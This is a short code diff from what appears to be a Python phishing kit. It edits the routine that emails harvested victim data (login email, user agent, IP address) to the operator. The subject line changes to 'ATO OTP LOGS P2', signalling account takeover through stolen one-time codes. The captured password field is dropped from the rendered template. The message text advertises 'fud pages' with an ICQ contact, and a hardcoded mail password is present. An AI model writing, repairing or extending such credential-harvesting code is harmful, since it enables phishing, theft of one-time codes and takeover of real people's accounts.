@@ -188,7 +188,7 @@ def second():
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS P2"
+        message["Subject"] = "ATO OTP LOGS P2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -196,7 +196,7 @@ def second():
         How are you?
         contact me on icq jamescartwright for your fud pages
         """
-        html = render_template('otp.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
+        html = render_template('otp.html', emailaccess=email, useragent=useragent, ipman=ip)
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
